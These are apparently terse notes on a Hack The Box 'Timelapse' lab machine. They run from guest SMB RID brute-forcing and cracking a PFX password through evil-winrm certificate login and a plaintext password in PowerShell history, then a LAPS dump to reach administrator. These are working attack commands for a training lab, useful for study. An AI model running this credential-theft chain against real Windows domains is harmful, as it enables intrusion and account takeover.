netexec smb $ip -u guest -p '' --rid-brute | awk -F'\\' '{print $2}' | awk '{print $1}' > users
2026/08/12 06:04:32 >  [+] VALID USERNAME:       Administrator@timelapse.htb
2026/08/12 06:04:32 >  [+] VALID USERNAME:       Guest@timelapse.htb
2026/08/12 06:04:32 >  [+] VALID USERNAME:       thecybergeek@timelapse.htb
2026/08/12 06:04:32 >  [+] VALID USERNAME:       DC01$@timelapse.htb
2026/08/12 06:04:32 >  [+] VALID USERNAME:       payl0ad@timelapse.htb
2026/08/12 06:04:32 >  [+] VALID USERNAME:       babywyrm@timelapse.htb
2026/08/12 06:04:32 >  [+] VALID USERNAME:       legacyy@timelapse.htb
2026/08/12 06:04:32 >  [+] VALID USERNAME:       sinfulz@timelapse.htb
2026/08/12 06:04:32 >  [+] VALID USERNAME:       WEB01$@timelapse.htb
2026/08/12 06:04:32 >  [+] VALID USERNAME:       DB01$@timelapse.htb
2026/08/12 06:04:32 >  [+] VALID USERNAME:       DEV01$@timelapse.htb
2026/08/12 06:04:32 >  [+] VALID USERNAME:       svc_deploy@timelapse.htb


smb file zipped winrm_backup.zip  supremelegacy
<img width="703" height="156" alt="image" src="https://github.com/user-attachments/assets/bec298c9-9d86-4fa0-a399-2162135d57e6" />
<img width="450" height="81" alt="image" src="https://github.com/user-attachments/assets/7bea16e7-7d7a-4a96-9ab9-0acb2c5ba754" />  

pfx2john legacyy_dev_auth.pfx > hashes.txt
john
password is thuglegacy
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out key.cert

evil-winrm -i 10.10.11.152 -c key.cert -k key.pem -S  
<img width="1105" height="275" alt="image" src="https://github.com/user-attachments/assets/5889da8b-ae2a-4ce7-bb8b-df1963ec65bc" />

PS history file: C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt  
<img width="1204" height="182" alt="image" src="https://github.com/user-attachments/assets/2a6ba503-b6c9-4111-8253-54be90b98816" />

svc_deploy : E3R$Q62^12p7PLlC%KWaxuaV
<img width="1515" height="112" alt="image" src="https://github.com/user-attachments/assets/9241f85c-01ff-4498-aa06-fbde8ef35326" />

evil winrm use -S because its on port 5986 which requires ssl not 5985
<img width="1114" height="224" alt="image" src="https://github.com/user-attachments/assets/fce5dbcf-de32-415f-8061-617c6289ee38" />

bloodhound 
<img width="1159" height="207" alt="image" src="https://github.com/user-attachments/assets/3f2ea508-fac7-4c1e-bfb4-b77b67a0ea68" />

impacket getlaps
<img width="1025" height="142" alt="image" src="https://github.com/user-attachments/assets/0c9fdc7f-8d43-427d-8d60-ceba32838fca" />

evil winrm using the laps password
<img width="1116" height="221" alt="image" src="https://github.com/user-attachments/assets/446904b3-7d68-4b98-8822-098d034d6ecb" />
